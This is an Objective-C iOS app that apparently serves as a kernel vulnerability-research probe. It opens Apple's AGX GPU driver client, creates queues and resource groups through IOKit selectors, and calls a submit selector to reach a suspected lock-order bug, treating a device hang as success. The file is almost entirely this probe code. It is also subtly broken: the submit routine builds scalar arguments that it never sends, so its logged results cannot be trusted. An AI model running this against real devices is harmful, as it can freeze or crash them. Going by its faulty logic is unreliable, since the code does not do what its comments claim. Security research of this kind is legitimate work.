//
//  agxsub.m — p21：用 resource group 建 type=3 命令，走 sel 26 提交
//
//  已确认的全部前置（p0 / p19 / p20 实测）：
//    sel 7   in=0x408 全零  → SUCCESS, out=0x10, id(u32[0])=1
//    sel 9   resType=3 cap=0x80（Metal 预热后）→ SUCCESS, out=0x100
//              u32[7](+0x1C) = resource group ID   (1,2,3,...)
//              u64[3](+0x18) = ID << 28            (handle 形式)
//    sel 25  scalars=[qid, X] → 设 queue+0x428（第二次会返回 0xe00002c9 "已存在"）
//    sel 26  scalars=[qid, ?, count, stride], structIn = count*stride
//              早退（+0x428==0）时返回 0xe00002bc
//
//  本包跑两组，各自独立建队列（因为 sel 25 对同一队列只能设一次）：
//    Group A: sel 25 用 handle (u64[3] = ID<<28)，再 sel 26 用 handle
//    Group B: sel 25 用 raw ID (u32[7])，再 sel 26 用 raw ID
//
//  ★ 判据：sel 26 从 0xe00002bc 变成【任何别的码】= 进了提交循环
//          即 458→528 那条锁序被真正执行到完整循环
//

#import <UIKit/UIKit.h>
#import <Metal/Metal.h>
#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <unistd.h>

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static const char *kr_hint(uint32_t k)
{
    switch (k) {
        case 0:          return "SUCCESS";
        case 0xe00002bc: return "Error(早退)";
        case 0xe00002be: return "NoResources";
        case 0xe00002c2: return "BadArgument";
        case 0xe00002c9: return "InternalError(已存在)";
        case 0xe00002cc: return "NotOpen";
        case 0xe00002e2: return "NotPermitted";
        default:         return "?";
    }
}

static void L(const char *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    char buf[1024];
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    NSString *s = [NSString stringWithUTF8String:buf];
    if (!s) return;
    NSLog(@"AGXSUB %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"agxsub.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    dispatch_sync(dispatch_get_main_queue(), ^{
        [gLog appendString:line];
        if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) {
            gStatus.text = s;
            gStatus.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightBold];
        }
    });
}

static BOOL metal_warmup(void)
{
    L("=== Phase 1: Metal warmup ===");
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { L("  !! Metal unavailable"); return NO; }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    if (!q) return NO;
    MTLTextureDescriptor *td =
        [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:MTLPixelFormatRGBA8Unorm
                                                           width:16 height:16 mipmapped:NO];
    td.usage = MTLTextureUsageRenderTarget;
    td.storageMode = MTLStorageModePrivate;
    id<MTLTexture> tex = [dev newTextureWithDescriptor:td];
    if (!tex) return NO;
    id<MTLCommandBuffer> cb = [q commandBuffer];
    MTLRenderPassDescriptor *rp = [MTLRenderPassDescriptor renderPassDescriptor];
    rp.colorAttachments[0].texture     = tex;
    rp.colorAttachments[0].loadAction  = MTLLoadActionClear;
    rp.colorAttachments[0].storeAction = MTLStoreActionStore;
    rp.colorAttachments[0].clearColor  = MTLClearColorMake(1,0,1,1);
    id<MTLRenderCommandEncoder> enc = [cb renderCommandEncoderWithDescriptor:rp];
    if (!enc) return NO;
    [enc endEncoding];
    [cb commit];
    [cb waitUntilCompleted];
    BOOL ok = (cb.status == MTLCommandBufferStatusCompleted);
    L("  device=%s  waitUntilCompleted=%s", [[dev name] UTF8String], ok ? "Completed" : "NOT");
    return ok;
}

// 建队列
static uint32_t create_queue(io_connect_t conn, const char *tag)
{
    uint8_t in[0x408];
    memset(in, 0, sizeof(in));
    uint8_t out[0x10];
    memset(out, 0, sizeof(out));
    size_t os = sizeof(out);
    kern_return_t kr = IOConnectCallStructMethod(conn, 7, in, sizeof(in), out, &os);
    uint32_t id = (os >= 4) ? *(uint32_t *)out : 0;
    L("  [%s] sel7 建队列 -> 0x%08x %s outSize=0x%zx id=%u",
      tag, (uint32_t)kr, kr_hint((uint32_t)kr), os, id);
    return (kr == KERN_SUCCESS) ? id : 0;
}

// 建 resource group，返回 raw ID 与 handle
static BOOL create_group(io_connect_t conn, const char *tag, uint32_t *outRawId, uint64_t *outHandle)
{
    uint8_t in[0x100];
    memset(in, 0, sizeof(in));
    *(uint32_t *)(in + 0x00) = 0x03;    // resType = 3
    *(uint32_t *)(in + 0x38) = 0x80;    // capacity

    uint8_t out[0x100];
    memset(out, 0, sizeof(out));
    size_t os = sizeof(out);
    kern_return_t kr = IOConnectCallStructMethod(conn, 9, in, sizeof(in), out, &os);

    uint32_t rawId  = (os >= 0x20) ? *(uint32_t *)(out + 0x1C) : 0;   // u32[7]
    uint64_t handle = (os >= 0x20) ? *(uint64_t *)(out + 0x18) : 0;   // u64[3]

    L("  [%s] sel9 resType=3 cap=0x80 -> 0x%08x %s outSize=0x%zx  rawId(u32[7])=%u  handle(u64[3])=0x%llx",
      tag, (uint32_t)kr, kr_hint((uint32_t)kr), os, rawId, (unsigned long long)handle);
    *outRawId = rawId;
    *outHandle = handle;
    return (kr == KERN_SUCCESS);
}

// sel 25：设 queue+0x428
static kern_return_t set_notification_queue(io_connect_t conn, uint32_t qid, uint64_t handle, const char *tag)
{
    uint64_t in[2] = { qid, handle };
    uint64_t out[4]; memset(out, 0, sizeof(out));
    uint32_t oc = 4;
    kern_return_t kr = IOConnectCallScalarMethod(conn, 25, in, 2, out, &oc);
    L("  [%s] sel25 qid=%u handle=0x%llx -> 0x%08x %s",
      tag, qid, (unsigned long long)handle, (uint32_t)kr, kr_hint((uint32_t)kr));
    return kr;
}

// sel 26：提交
static kern_return_t submit(io_connect_t conn, uint32_t qid, uint64_t x, uint32_t count, uint32_t stride, const char *tag)
{
    uint64_t sc[4] = { qid, x, count, stride };
    size_t sz = (size_t)count * stride;
    if (sz == 0 || sz > 0x1000) { L("  [%s] sel26 参数非法", tag); return 0xdeadbeef; }
    uint8_t *in = calloc(sz, 1);
    if (!in) return 0xdeadbeef;

    kern_return_t kr = IOConnectCallStructMethod(conn, 26, in, sz, NULL, NULL);
    L("  [%s] sel26 qid=%u x=0x%llx count=%u stride=0x%x in=%zu -> 0x%08x %s",
      tag, qid, (unsigned long long)x, count, stride, sz, (uint32_t)kr, kr_hint((uint32_t)kr));
    free(in);
    return kr;
}

// 一组完整流程
static void run_one(io_connect_t conn, const char *tag, BOOL useHandle)
{
    L("");
    L("========== Group %s（sel25/sel26 用 %s）==========", tag, useHandle ? "handle(ID<<28)" : "rawId");

    uint32_t qid = create_queue(conn, tag);
    if (!qid) { L("  建队列失败，跳过"); return; }
    usleep(80 * 1000);

    uint32_t rawId = 0; uint64_t handle = 0;
    if (!create_group(conn, tag, &rawId, &handle)) { L("  建 group 失败，跳过"); return; }
    usleep(80 * 1000);

    uint64_t x = useHandle ? handle : (uint64_t)rawId;

    kern_return_t k25 = set_notification_queue(conn, qid, x, tag);
    usleep(80 * 1000);

    // 先试 stride=0x38（p0 已验证该 stride 能进 B 路径）
    kern_return_t k26 = submit(conn, qid, x, 1, 0x38, tag);
    usleep(150 * 1000);

    // 若还是早退，换几种 count/stride 组合
    if ((uint32_t)k26 == 0xe00002bc) {
        submit(conn, qid, x, 1, 0x20, tag);
        submit(conn, qid, x, 2, 0x38, tag);
        submit(conn, qid, x, 0, 0x38, tag);
    }

    L("  >>> Group %s 小结: sel25=0x%08x sel26=0x%08x", tag, (uint32_t)k25, (uint32_t)k26);
}

static void run(void)
{
    L("===== p21: resource group -> type=3 command -> sel 26 submit =====");
    L("uid=%d pid=%d", getuid(), getpid());
    L("判据: sel26 从 0xe00002bc 变成别的码 = 进了完整提交循环");
    L("");

    BOOL warmed = metal_warmup();
    if (!warmed) L("!! warmup failed，结果只能作基线");

    L("");
    L("=== open AGX client ===");
    CFMutableDictionaryRef m = IOServiceMatching("AGXAcceleratorG13P_B0");
    io_service_t svc = m ? IOServiceGetMatchingService(kIOMainPortDefault, m) : MACH_PORT_NULL;
    if (svc == MACH_PORT_NULL) { L("  no service"); SetStatus(@"no service"); return; }
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
    L("  open(type=1) -> 0x%08x %s conn=0x%x", (uint32_t)kr, kr_hint((uint32_t)kr), conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { SetStatus(@"open fail"); return; }

    run_one(conn, "A", YES);   // handle
    run_one(conn, "B", NO);    // rawId

    L("");
    L("=== VERDICT ===");
    L("  · 某组的 sel26 不再是 0xe00002bc  => *** 进了提交循环，458->528 被真正执行");
    L("  · 仍是 0xe00002bc                => +0x428 未生效 或 命令格式还不对");
    L("  · sel25 = 0xe00002c9             => 该队列已设过（正常，换组即可）");
    L("  · 出现 hang / 设备卡死            => ABBA 撞上了");

    SetStatus(@"done - see log");
    IOServiceClose(conn);
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("agxsub.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 52, self.window.bounds.size.width - 16, 30)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"agxsub (p21)...";
    gStatus.textColor = [UIColor colorWithRed:0.4 green:0.9 blue:1.0 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];

    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 84, self.window.bounds.size.width, h - 84)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:9] ?: [UIFont systemFontOfSize:9];
    gView.editable = NO;
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
